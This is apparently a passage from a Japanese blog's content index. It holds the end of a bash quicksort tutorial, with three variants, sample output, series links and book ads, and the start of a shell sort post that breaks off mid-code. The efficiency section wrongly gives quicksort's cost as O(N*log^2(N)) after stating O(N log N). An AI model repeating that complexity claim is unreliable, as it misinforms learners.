https://www.youtube.com/watch?v=aQiWF4E8flQ #　平均計算時間が O(n Log n) #　安定ソートではない #　最大計算時間が O(n^2) # # データ数が 50 以下なら挿入ソート (Insertion Sort) # データ数が 5 万以下ならマージソート (Merge Sort) # データ数がそれより多いならクイックソート (Quick Sort) # # 1. 一般的なクイックソート # 2. ３つのメジアンによる分割と、 # 小さな配列の場合はマニュアルソートを取り入れたクイックソート # 3. # # ############## # 共通ブロック ############## ## # display() # 表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo \u0026#34;$i\u0026#34; \u0026#34;${array[\u0026#34;$i\u0026#34;]}\u0026#34;; } echo \u0026#34;------\u0026#34; ; } ## # insert() # 配列の作成 function insert(){ array[$((nElems++))]=$1 } ## # setArray() # 配列をセット function setArray(){ nElems=0; for((i=0; i\u0026lt;\u0026#34;$1\u0026#34;; i++)){ insert `echo \u0026#34;$RANDOM\u0026#34;` ; } } ## # pertisionIt() # function pertisionIt(){ #最初の成分の右 local leftPtr=$1 ; #分割値の左 local rightPtr=$(($2-1)) ; local pivot=$3 while :; do #より大きい項目を見つける while (( \u0026#34;${array[++leftPtr]}\u0026#34; \u0026lt; \u0026#34;$pivot\u0026#34; )); do : done #より小さい項目を見つける while (( \u0026#34;${array[--rightPtr]}\u0026#34; \u0026gt; \u0026#34;$pivot\u0026#34; )); do : done #ポインタが交差したら if [ \u0026#34;$leftPtr\u0026#34; -ge \u0026#34;$rightPtr\u0026#34; ]; then #分割は終了 break ; else # leftPtr rightPtr #交差していないので成分を入れ替える local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[rightPtr]}\u0026#34; ; array[rightPtr]=\u0026#34;$tmp\u0026#34; ; fi done #leftPtr right-1 #分割値をリストア local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[right-1]}\u0026#34; ; array[right-1]=\u0026#34;$tmp\u0026#34; ; #分割値の位置を返す pertision=\u0026#34;$leftPtr\u0026#34; ; } ## # medialOf3() # function medianOf3(){ local left=$1 ; local right=$2 ; local center=\u0026#34;$(( (left+right) / 2 ))\u0026#34; ; if [ \u0026#34;${array[left]}\u0026#34; -gt \u0026#34;${array[center]}\u0026#34; ]; then # left / centerを正順化 local tmp=\u0026#34;${array[left]}\u0026#34; ; array[left]=\u0026#34;${array[center]}\u0026#34; ; array[center]=\u0026#34;$tmp\u0026#34; ; fi if [ \u0026#34;${array[left]}\u0026#34; -gt \u0026#34;${array[right]}\u0026#34; ]; then # left / rightを正順化 local tmp=\u0026#34;${array[left]}\u0026#34; ; array[left]=\u0026#34;${array[right]}\u0026#34;; array[right]=\u0026#34;$tmp\u0026#34; ; fi if [ \u0026#34;${array[center]}\u0026#34; -gt \u0026#34;${array[right]}\u0026#34; ]; then # center rightを正順化 local tmp=\u0026#34;${array[center]}\u0026#34; ; array[center]=\u0026#34;${array[right]}\u0026#34; ; array[right]=\u0026#34;$tmp\u0026#34; ; fi # 分割値をrightに local tmp=\u0026#34;${array[center]}\u0026#34; ; array[center]=\u0026#34;${array[right-1]}\u0026#34; ; array[right-1]=\u0026#34;$tmp\u0026#34; ; #メジアンの値を返す median=\u0026#34;${array[right-1]}\u0026#34; ; } ## # ######################################## # 3. 【完成版】小さな分割の場合に挿入ソートを行うクイックソート # クイックソートのような強力なアルゴリズムが、再帰呼び出しの行き着く果てに、わ # ずか２項目か３項目の小さな配列にも適用されるのは、妙な感じがします。最後の段 # 階、いわゆる小さな分割の場合に挿入ソートを行うクイックソート完成版。 # 分割によってできる部分配列がある程度大きい間はクイックソートをして、それ以降 # の小さな部分配列はそのまま放置します。そうすると、配列全体としては、ほとんど # ソートされた状態になります。その配列全体に対して、今度は挿入ソートを適用しま # す。挿入ソートはほとんどソートされた状態の配列に対しては高速です。と、何人か # の専門家は言っていますが、実は挿入ソートは、大きな配列を１つソートするより、 # 小さなソートをたくさんするほうが向いているのです。 ## # insertionSort3() # 挿入ソート function insertionSort(){ for((out=left+1; out\u0026lt;=right; out++ )){ tmp=\u0026#34;${array[out]}\u0026#34; ; in=\u0026#34;$out\u0026#34; ; while(( in\u0026gt;left \u0026amp;\u0026amp; array[in-1]\u0026gt;=tmp )); do array[in]=\u0026#34;${array[in-1]}\u0026#34; ; ((--in)); done array[in]=\u0026#34;$tmp\u0026#34; } } ## # quickSort3() # クイックソート挿入ソート導入型 function quickSort3(){ local left=\u0026#34;$1\u0026#34; ; local right=\u0026#34;$2\u0026#34; ; local size=$((right-left+1)) ; #小さければ挿入ソート if [ \u0026#34;$size\u0026#34; -lt 10 ]; then insertionSort \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; ; else medianOf3 \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; ; #範囲を分割する 戻り値は $pertision pertisionIt \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; \u0026#34;$median\u0026#34;; #左側をソート quickSort3 \u0026#34;$left\u0026#34; \u0026#34;$((pertision-1))\u0026#34; ; #右側をソート quickSort3 \u0026#34;$((pertision+1))\u0026#34; \u0026#34;$right\u0026#34; ; fi } ## # exec_QuickSort3() # クイックソート挿入ソート導入型 function exec_QuickSort3(){ setArray \u0026#34;$1\u0026#34; ; # display ; quickSort3 0 $((nElems-1)); display ; } # ######################################## # 2. ３つのメジアンによる分割と # 要素数が３よりも小さな配列の場合はマニュアルソートを取り入れたクイックソート # # クイックソートの分割値の選び方は、これまでにいろんな方法が提案されています。 # その選び方は簡単でしかも最大や最小の値には決してならないという方法でなければ # なりません。ランダムに選ぶのは方法としては簡単ですが、すでに見たように必ずし # も常によい選択になるとは限りません。では全ての項目の値を調べて、そのメジアン # をとるというのはどうでしょう？この方法は分割値の決め方としては理想的でもしか # し、ソートそのものよりも多くの時間を要してしまいますから実用的ではありません。 # そこで妥協案として考えられたのが、配列の最初の項目、最後の項目、そして中央の # 項目の中央の値を分割値とする方法を、３つのメジアンと言います。 # さらに成分が３よりも少ない小さな配列をソートするmanualSort()を実装しています。 # このメソッドは、部分配列が１セル以下なら直ちにリターン、２セルなら必要な入れ # 替えを行い、３セルならソートをします。３のメジアン法は、配列が４成分以上でな # いと使えませんから、３成分以下の配列に対しては今回のrecQuickSort()では使えな # いのです。 ## ## # manualSort() # function manualSort(){ local left=\u0026#34;$1\u0026#34; ; local right=\u0026#34;$2\u0026#34; ; local size=$((right-left+1)) ; if [ \u0026#34;$size\u0026#34; -le 1 ]; then #ソート不要 return ; fi if [ \u0026#34;$size\u0026#34; -eq 2 ]; then #２のソート leftとrightを入れ替える if [ \u0026#34;${array[left]}\u0026#34; -gt \u0026#34;${array[right]}\u0026#34; ]; then local tmp=\u0026#34;${array[left]}\u0026#34; ; array[left]=\u0026#34;${array[right]}\u0026#34; ; array[right]=\u0026#34;$tmp\u0026#34; ; return ; fi else #サイズが３ #３のソート,left, center, (right-1) \u0026amp; right if [ \u0026#34;${array[left]}\u0026#34; -gt \u0026#34;${array[right-1]}\u0026#34; ]; then # left / center local tmp=\u0026#34;${array[left]}\u0026#34; ; array[left]=\u0026#34;${array[right-1]}\u0026#34; ; array[right-1]=\u0026#34;$tmp\u0026#34; ; fi # left / right if [ \u0026#34;${array[left]}\u0026#34; -gt \u0026#34;${array[right]}\u0026#34; ]; then local tmp=\u0026#34;${array[left]}\u0026#34; ; array[left]=\u0026#34;${array[right]}\u0026#34; ; array[right]=\u0026#34;$tmp\u0026#34; ; fi # center / right if [ \u0026#34;${array[right-1]}\u0026#34; -gt \u0026#34;${array[right]}\u0026#34; ]; then local tmp=\u0026#34;${array[right-1]}\u0026#34; ; array[right-1]=\u0026#34;${array[right]}\u0026#34; ; array[right]=\u0026#34;$tmp\u0026#34; ; fi fi } ## # quickSort2() # クイックソート改良版 function quickSort2(){ local left=\u0026#34;$1\u0026#34; ; local right=\u0026#34;$2\u0026#34; ; local size=$((right-left+1)) ; if [ \u0026#34;$size\u0026#34; -le 3 ]; then #小さければマニュアルソート manualSort \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; ; else medianOf3 \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; ; #範囲を分割する 戻り値は $pertision pertisionIt \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; \u0026#34;$median\u0026#34;; #左側をソート quickSort2 \u0026#34;$left\u0026#34; \u0026#34;$((pertision-1))\u0026#34; ; #右側をソート quickSort2 \u0026#34;$((pertision+1))\u0026#34; \u0026#34;$right\u0026#34; ; fi } ## # exec_QuickSort2() # クイックソート改良型 function exec_QuickSort2(){ setArray \u0026#34;$1\u0026#34; ; # display ; quickSort2 0 $((nElems-1)); display ; } ######################################## # 普通のクイックソート ######################################## ## # pertionIt1() # 基本形のクイックソートで言うところのソートは # このメソッドで行う # メジアン・挿入ソート導入版といった共通メソッドの # pertisionIt()とはちょっと内容が異なる function pertisionIt1(){ #最初の成分の右 local leftPtr=$(($1-1)) ; #分割値の左 local rightPtr=\u0026#34;$right\u0026#34; ; # local pivot=\u0026#34;$3\u0026#34; ; while :; do #より大きい項目を見つける while ((array[++leftPtr]\u0026lt;pivot)); do : done #より小さい項目を見つける while ((rightPtr\u0026gt;0 \u0026amp;\u0026amp; array[--rightPtr]\u0026gt;pivot)); do : done #ポインタが交差したら if [ \u0026#34;$leftPtr\u0026#34; -ge \u0026#34;$rightPtr\u0026#34; ]; then #分割は終了 break ; else #交差していないので成分を入れ替える local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[rightPtr]}\u0026#34; ; array[rightPtr]=\u0026#34;$tmp\u0026#34; ; fi done #分割値をリストア local tmp=\u0026#34;${array[leftPtr]}\u0026#34; ; array[leftPtr]=\u0026#34;${array[right]}\u0026#34; ; array[right]=\u0026#34;$tmp\u0026#34; ; #分割値の位置を返す pertision=\u0026#34;$leftPtr\u0026#34; ; } ## # quickSort1() # クイックソート初期型 function quickSort1(){ local left=\u0026#34;$1\u0026#34; ; local right=\u0026#34;$2\u0026#34; ; local size=$((right-left)) ; # サイズが１なら if [ \u0026#34;$size\u0026#34; -le 0 ]; then return; # ソート済み else # サイズが２以上 #範囲を分割する 戻り値は $pertision pivot=\u0026#34;${array[$right]}\u0026#34;; pertisionIt1 \u0026#34;$left\u0026#34; \u0026#34;$right\u0026#34; \u0026#34;$pivot\u0026#34;; #左側をソート quickSort1 \u0026#34;$left\u0026#34; \u0026#34;$((pertision-1))\u0026#34; ; #右側をソート quickSort1 \u0026#34;$((pertision+1))\u0026#34; \u0026#34;$right\u0026#34; ; fi } ## # exec_QuickSort1() # クイックソート初期型 function exec_QuickSort1(){ setArray \u0026#34;$1\u0026#34; ; # display ; quickSort1 0 $((nElems-1)); display ; } ### # メイン ### # クイックソート基本型 time exec_QuickSort1 100 ; # クイックソート３つのメジアン time exec_QuickSort2 100 ; # クイックソート挿入ソート導入型 time exec_QuickSort3 100 ; exit ; # 実行結果は以下のとおりです。\nbash-5.1$ bash 05_3QuickSort.sh 0 51 1 639 2 946 3 1111 4 1134 5 1201 6 1214 7 1570 8 1876 9 2166 10 3275 11 3286 12 4467 13 4524 14 5588 15 7475 16 8195 17 8311 18 8485 19 8631 20 9096 21 9492 22 9609 23 10122 24 10126 25 10383 26 11150 27 11342 28 11823 29 12001 30 12013 31 12019 32 12460 33 13414 34 13434 35 13859 36 14342 37 14699 38 15287 39 15966 40 16220 41 16366 42 16450 43 16634 44 16902 45 17570 46 18961 47 19139 48 19491 49 19689 50 20049 51 20117 52 20143 53 20337 54 20391 55 20598 56 20614 57 20705 58 20800 59 21073 60 21123 61 22054 62 22216 63 22448 64 23244 65 23329 66 23337 67 24460 68 24627 69 25221 70 25430 71 25510 72 25514 73 25518 74 25988 75 26082 76 26232 77 26245 78 27646 79 27666 80 27954 81 28378 82 28519 83 28707 84 28825 85 28912 86 28929 87 29122 88 29323 89 29772 90 29784 91 30049 92 30303 93 30328 94 30526 95 31235 96 31278 97 31364 98 31998 99 32416 ------ real\t0m0.132s user\t0m0.077s sys\t0m0.054s 0 118 1 899 2 1009 3 1610 4 1678 5 2049 6 2159 7 2392 8 2648 9 2700 10 3443 11 3470 12 3597 13 3696 14 3764 15 4184 16 4327 17 4471 18 4541 19 4543 20 4589 21 5683 22 6092 23 6132 24 6509 25 6965 26 6994 27 7349 28 7684 29 8097 30 8121 31 8291 32 8664 33 8670 34 8720 35 8852 36 9192 37 9326 38 9764 39 10465 40 11547 41 11884 42 11944 43 12128 44 12310 45 13098 46 13168 47 13485 48 13492 49 13745 50 14036 51 14606 52 14886 53 14942 54 14971 55 15523 56 16456 57 16644 58 16916 59 16947 60 17110 61 17132 62 19004 63 19423 64 20800 65 20857 66 21001 67 21138 68 22228 69 22274 70 22395 71 22423 72 22576 73 22602 74 23062 75 23577 76 23625 77 24046 78 24048 79 24351 80 24353 81 24814 82 25219 83 25342 84 26001 85 26074 86 26229 87 27563 88 27568 89 27590 90 29011 91 29039 92 29328 93 29552 94 29859 95 29998 96 30834 97 31909 98 32129 99 32325 ------ real\t0m0.148s user\t0m0.078s sys\t0m0.059s 0 311 1 1358 2 1502 3 1625 4 1629 5 2050 6 2760 7 3279 8 3572 9 4288 10 4740 11 5410 12 5667 13 6727 14 6773 15 6785 16 6993 17 7006 18 7244 19 7864 20 8011 21 8207 22 8281 23 8912 24 8939 25 9319 26 9359 27 9435 28 9716 29 9923 30 10108 31 10166 32 10402 33 10617 34 10689 35 11217 36 11771 37 11983 38 12705 39 12750 40 12935 41 12987 42 13103 43 13340 44 14249 45 14298 46 14385 47 14419 48 14428 49 14473 50 14807 51 15507 52 16484 53 16498 54 16757 55 17145 56 17596 57 18493 58 18555 59 18790 60 19105 61 19169 62 19265 63 19383 64 20308 65 21237 66 21385 67 21597 68 21901 69 22063 70 22450 71 22586 72 22606 73 22641 74 22797 75 22910 76 23455 77 23715 78 24059 79 24251 80 24947 81 25391 82 25515 83 26062 84 26405 85 26463 86 26498 87 26702 88 26973 89 27079 90 27496 91 27984 92 28198 93 30377 94 30489 95 31001 96 31789 97 31912 98 32142 99 32270 ------ real\t0m0.127s user\t0m0.067s sys\t0m0.059s bash-5.1$ クイックソートの効率 クイックソートは O(N＊log(N)）で実行されます。\nマージソートをご紹介したとき、このような対数型の実行時間は、 分割統治型のアルゴリズムの 共通的な特徴だ、とお話ししました。\n再帰メソッドが、項目の範囲を次々と二分しながら、 それら小部分に対して自分自身を呼び出していく、というマージソートやクイックソートのようなアルゴリズムは、分割統治型アルゴリズムの典型です。\nこの場合、対数の基数は2ですから、実行時間はO(N＊log^2(N))に比例する、といえます。\nプログラムソース この章で使っているプログラムソースは以下にあります。\n05_3QuickSort.sh クイックソート\nこれまでのソートまとめ ソートまとめ 「ざっくり」シリーズのご紹介 【アルゴリズム クイックソート】ざっくりわかるシェルスクリプト１９\nhttps://suzukiiichiro.github.io/2022-11-01-01-quicksort-suzuki/\n【アルゴリズム シェルソート】ざっくりわかるシェルスクリプト１８\nhttps://suzukiiichiro.github.io/2022-10-27-01-shellsort-suzuki/\n【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７\nhttps://suzukiiichiro.github.io/2022-10-19-01-mergesort-suzuki/\n【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６\nhttps://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/\n【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-01T11:35:46+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-01-01-quicksort-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-01-01-quicksort-suzuki/","title":"【アルゴリズム クイックソート】ざっくりわかるシェルスクリプト１９"},{"content":"シェルソート シェルソートは、挿入ソートの欠点を補う形で考案されたソートアルゴリズムです。\nシェルソート シェル＝貝殻　というのは「がせ情報」で、じつはドナルド・シェルという人が考えたことから「シェルソート」と言われています。\nヒント 余談ですが、ヒープソートは「メモリ領域」とは全く無関係で、２分ヒープ木を用いて行うソートアルゴリズムです。 挿入ソートは、特定の要素を１つだけ取り出し、整列済み配列の適切な場所に挿入することで並べ替えを行います。\nこれにより、挿入ソートの欠点は、特定の要素を遠く離れた位置に移動するために、挿入する場所を確保し、その右側に整列されていた多くの要素を移動する必要がありました。\nシェルソートは、インターバルと呼ばれる要素間の「間隔」を上手に使って、挿入ソートの欠点であった「挿入のための要素の移動」を最小限に留めることができます。\n挿入ソートを振り返る まず、挿入ソートを思い出してみます。\n挿入ソート まず、上記の図では、一番左にある８が整列済みとしてスタートします。\nそして左から２番めの５を比較対象（ターゲット）とします。\n比較対象の５と、整列済みの適切な位置に挿入します。\n整列済み配列は８だけですから、５と８の比較となります。\n５は８の手前に挿入します。\nこれにより、整列済み配列は、５，８の２つとなり、比較対象は右に１つずれて３となります。\n比較対象の３を整列済み配列５，８の適切な位置に挿入します。\n３，５，８と並ぶように、５と８を右に一つずつずらし、３を挿入する空きスペースを確保してから、３を５の左に挿入します。\n挿入するための空きスペースを確保するために、整列済み配列を右に１つずつずらす必要があることが、とても大変です。\nシェルソートのアルゴリズム シェルソートのアルゴリズムを見てみます。\nシェルソートのアルゴリズムは、動くGIFよりも動かない静止画で見たほうがわかりやすいです。\nまず、整列前の配列を以下に示します。\nシェルソート シェルソートは「インターバル」という概念が導入されています。\nここでは簡単なインターバルを設定してみます。\n配列の要素数を「N」とします。\nインターバルは\nN/２ N/４ N/8の３つとします。\nNが８ですから、\nN/２は４\nN/４は２\nN/８は１となります。\nでは最初にN/２（４）をインターバルにして処理を開始します。\nインターバルが４ですから、\n３３と１２\n３１と１７\n４０と２５\n８と４２\nの要素が交換対象です。\n図で示すと以下のようになります。\nシェルソート ３３と１２　を並べ替えます。\n３１と１７　を並べ替えます。\n４０と２５　を並べ替えます。\n８と４２　を並べ替えます。\n交換する必要がない場合はそのままの位置においたまま次の処理に進みます。\nインターバルがN/２（４）の場合の交換後のイメージは以下の図のようになります。\nシェルソート まだまだソートが完了していないことがわかります。\nそこで、次のインターバルで処理を行います。\n次のインターバルは N/４＝２ です。\nさきほどは、２つの要素の交換でしたが、今回はインターバルが小さいので４つの要素の交換を同時に行います。\n図で示すと以下の通りとなります。\nシェルソート １２，２５，３３，４０を並べ替えます。\nその後、\n１７，８，３１，４２を並べ替えます。\n色分けされている、\n青の要素のグループを並べ替え、\nオレンジの要素のグループを並べ替えます。\n青とオレンジそれぞれの並べ替えが完了すると以下の図のようになります。\nシェルソート いまいち、並べ替えた感じにはなっていませんね。\nでは３つ目のインターバル「N/８＝１」で処理を行います。\nシェルソートの感じの良いところは、この「N/８＝１」の場合のソートアルゴリズムに、挿入ソートを使っているところです。\nでは、上記の要素を挿入ソートで並べ替えてみます。\n上から順を追って見てください。\nシェルソート 一番左端の１２を整列済みとして、その隣の８を比較対象とします。\n８は１２の手前に挿入されます。\n比較対象は２５となり、並べ替えの必要がないため、となりの１７に比較対象をずらします。\n１７は２５の手前に挿入されます。\n次の比較対象は３３です。ここでも並べ替えの必要がないためとなりの３１に比較対象をずらします。\n比較対象３１は３３の手前に挿入されます。\n次の比較対象は４０です。４０も並べ替えの必要がないためそのままとし、次の比較対象を４２にずらします。\n４２も並べ替えが必要ではありませんので、そのままにしてソートが完了します。\nシェルソートについて２ シェルソートは、N/2、N/４、N/８とインターバルを細かくしていくことで、要素の移動を最小化することができることがわかったと思います。\n比較対象は並べ替える必要がない場合も多いのです。\nシェルソートの肝は「インターバル」です。\nこの「インターバル」は、要素の数によって適切に行うことで、より高速なソートが可能となります。（なるらしいです）\nインターバルの決め方 そうした「適切なインターバル」の計算式は色々あります。\nSell Sort Algorithm\n別にシェルソートが一番高速であるわけでもないので、N/２、N/４、N/８で良いと思います。（よいとしましょう）\nでもせっかくですからご紹介します。\nアルゴリズムの大家Knuth（クヌース）は、最良のインターバル数列を求める公式を以下の通り編み出しました。\nヒント インターバルは１をのぞき３倍して＋１する。 シェルソートではインターバル（間隔）の決め方が重要とされています。\nこれまでの説明では h＝４，２，１としてきました。\nこれが良くない理由として挙げられるのは、ソートの対象として同じ位置の要素ばかりが選択されてしまい、配列延滞をまんべんなくソートすることにはならないからです。\n＜＜ざっくり省略＞＞\n要素数 / ９を超えないように h（インターバル）を選ぶ方針が良いとされています。（諸説あります）\nステップ 計算式 ｈ（インターバル） ０ ３＊　０＋１＝ １ １ ３＊　１＋１＝ ４ ２ ３＊　４＋１＝ １３ ３ ３＊　１３＋１＝ ４０ ４ ３＊　４０＋１＝ １２１ ５ ３＊１２１＋１＝ ３６４ たとえば、要素数 ２０００ の配列に対しては、２０００・９＝２２２ですから、h の値を １２１, ４０, １３, ４, １ の順番で狭めていきます。\n下の方で紹介するbash/シェルスクリプトによるシェルソートの実装でもこのインターバルの手法を使っています。\nシェルソートのざっくり説明おさらい シェルソートは挿入ソートの改良版です。\nインターバル１はまさに挿入ソートです。\n挿入ソートの手順おさらい\n挿入ソートの途中段階で、比較対象の左側（要するに整列済み配列）はソートされていて、比較対象のの右側はまだ手つかずです。\nアルゴリズムは、比較対象項目を取り、一時変数に保存します。\n空になったセルの左隣から、ソート済みの項目を次々と右へ移動していき（つまり空のセルに整列済み配列を次々と右へ移動して）、一時変数に保存した項目が順序正しく挿入できる場所を確保します。\n問題点\n最大の要素がおさまるべき最も右端に「最も小さな要素」があったらどうなるでしょうか？\nその小さな項目を、左側の正しい場所に納めるためには、それより大きい全ての項目をいちいち右へ移動しなければなりません。\nこれは、極端な場合にはほとんどＮ回のコピーになります。\nたった１個の項目のためにＮ回ですよ。\nもちろん全ての項目がＮ回のコピーを必要とするわけではありませんから、平均すると１項目につきN/2回のコピー、それに項目数Ｎをかけますと、N^2/2回のコピーとなります。\n従って挿入ソートの実効性能はＯ（Ｎ＾２）です。\nそこで\n小さな項目を左へ移すとき、挿入ソートのようにその間の項目を全て右へシフトするのではなくて、\nその小さな項目だけを一挙に左に移す方法があれば、\nソートの実効性能はかなり良くなるのではないでしょうか。\nシェルソート\nシェルソートは大きなインターバルで飛び飛びに「挿入ソート」をすることによって、このような一挙移動を実現します。\n大きなインターバルによるソートが終わったら、今度はその最初のインターバルの間に並んでいる項目を、より狭いインターバルでソートが出来ます。\n配列をインターバル４でソートしたら、今度はそれをインターバル１でソートします。\nつまり通常の挿入ソートをします。\nこのインターバル４とインターバル１の組み合わせは、最初からインターバル１だけでソートを行う通常の挿入ソートに比べると相当に早いのです。\n最適なインターバル\nインターバルが１の場合を除きｈを３倍して＋１する\nらしい。\n挿入ソートとの比較 データ件数 挿入ソート シェルソート 1000個 0.001秒 0秒 10000個 0.093秒 0.002秒 100000個 9.329秒 0.027秒 1000000個 895.205秒 0.335秒 プログラムソース この章で使っているプログラムソースは以下にあります。\n05_2ShellSort.sh シェルソート\nbash/シェルスクリプトによるシェルソート いちおう、Knuth(クヌース）が編み出した、最良のインターバル数列で実装しています。\n#!/usr/bin/bash # #シェルソート #https://www.youtube.com/watch?v=M9YCh-ZeC7Y #　平均計算時間が O(ｎ^1.25) #　安定ソートではない #　挿入ソート改造版 #　３倍して１を足すという処理を要素を超えるまで行う # ## # display() # 表示 function display(){ for((i=0; i\u0026lt;\u0026#34;$nElems\u0026#34;; i++));do echo \u0026#34;$i\u0026#34; \u0026#34;${array[\u0026#34;$i\u0026#34;]}\u0026#34;; done echo \u0026#34;------\u0026#34; ; } ## # insert() # 配列を作成 function insert(){ array[((nElems++))]=$1 } ## # setArray() # 配列をセット function setArray(){ nElems=0; for((i=0; i\u0026lt;\u0026#34;$1\u0026#34;; i++));do insert `echo \u0026#34;$RANDOM\u0026#34;` ; done } ## # shellSort() # シェルソート function shellSort(){ #hの初期値 interval=1 ; # インターバルの計算 while (( \u0026#34;$interval\u0026#34; \u0026lt;= \u0026#34;$(($nElems/9))\u0026#34; )); do interval=$(($interval*3+1)) ; # (1,4,13,40,121.....) done #h=1になるまでhを減らす while (( \u0026#34;$interval\u0026#34;\u0026gt;0 )); do #hでソート for(( outer=\u0026#34;$interval\u0026#34;; outer\u0026lt;\u0026#34;$nElems\u0026#34; ; outer++ )); do tmp=\u0026#34;${array[$outer]}\u0026#34; ; inner=\u0026#34;$outer\u0026#34; ; #１つの部分的パス(0,4,8) while (( \u0026#34;$inner\u0026#34; \u0026gt; \u0026#34;$(($interval-1))\u0026#34; \u0026amp;\u0026amp; \u0026#34;${array[$(($inner-$interval))]}\u0026#34; \u0026gt;= \u0026#34;$tmp\u0026#34; )); do 